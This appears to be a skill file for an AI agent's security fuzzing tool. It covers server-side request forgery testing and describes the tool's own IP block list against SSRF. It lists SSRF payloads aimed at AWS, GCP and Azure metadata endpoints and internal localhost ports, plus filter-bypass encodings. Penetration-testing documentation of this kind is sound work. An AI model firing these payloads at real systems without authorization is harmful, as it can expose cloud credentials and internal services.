---
name: ssrf_testing
description: "Server-Side Request Forgery vulnerability detection and exploitation"
triggers:
  - ssrf
  - server side request forgery
  - request forgery
  - metadata
  - 169.254
  - cloud metadata
  - aws metadata
  - gcp metadata
  - private ip blocking
  - loopback blocking
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

SSRF testing finds vulnerabilities where server-side applications can be induced to make HTTP requests to arbitrary domains. This is particularly dangerous against cloud metadata services.

## Capabilities

- Basic SSRF detection
- Cloud metadata service access (AWS, GCP, Azure)
- Port scanning via SSRF
- Internal service enumeration
- Data exfiltration testing
- Blind SSRF detection via timing
- Filter bypass techniques

## Internal Protection (Built-in)

Slapper includes automatic SSRF prevention in `resolve_host()` and `validate_callback_url()`:

- Blocks loopback addresses (127.0.0.0/8, ::1)
- Blocks private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Blocks link-local (169.254.0.0/16, fe80::/10)
- Blocks documentation IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)
- Blocks benchmark range (198.18.0.0/15)
- Blocks unspecified (0.0.0.0) and multicast (224.0.0.1)
- Rejects `localhost` explicitly (case-insensitive)
- Validates ALL resolved IPs, not just first (prevents DNS rebinding bypass)
- IPv6 unique-local: `fc00::/7` via `(segments[0] & 0xfe00) == 0xfc00`

This prevents accidental SSRF when parsing user-provided hostnames in port scanning and other tools.

### Callback URL Validation with Injectable Resolver

For agent callback URLs, `validate_callback_url()` in `tool/protocol/agent_routes.rs` provides:
- `validate_callback_url(url)` - production wrapper using system DNS
- `validate_callback_url_with_resolver(url, resolver)` - testable variant accepting `Fn(&str, u16) -> Result<Vec<IpAddr>>`

This enables testing without network access using fake resolvers.

## Usage

### Basic SSRF Test

```bash
slapper fuzz --target https://example.com/fetch?url=test --type ssrf
```

### Cloud Metadata Test

```bash
slapper fuzz --target https://example.com/proxy?url=http://169.254.169.254 --type ssrf
```

### Internal Service Scan

```bash
slapper fuzz --target https://example.com/url?u=http://localhost: --type ssrf
```

## Payloads Reference

**Cloud Metadata:**
```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.azure.com/ns/instance
```

**Localhost Access:**
```
http://localhost/
http://127.0.0.1/
http://127.0.0.1:22
http://127.0.0.1:6379
```

**Filter Bypass:**
```
http://127.0.0.1 (not 127.0.0.1)
http://0x7f000001 (hex)
http://2130706433 (decimal)
http://[::1]/
```

## Triggers

Keywords: ssrf, server side request forgery, request forgery, fetch, url, metadata, cloud, aws, gcp, azure,169.254, local, localhost, proxy, webhook

## Best Practices

1. Always test against cloud metadata endpoints
2. Try both IPv4 and IPv6 addresses
3. Use timing-based detection for blind SSRF
4. Test various URL schemes (http, https, file, gopher)
5. Check for header injection in redirected requests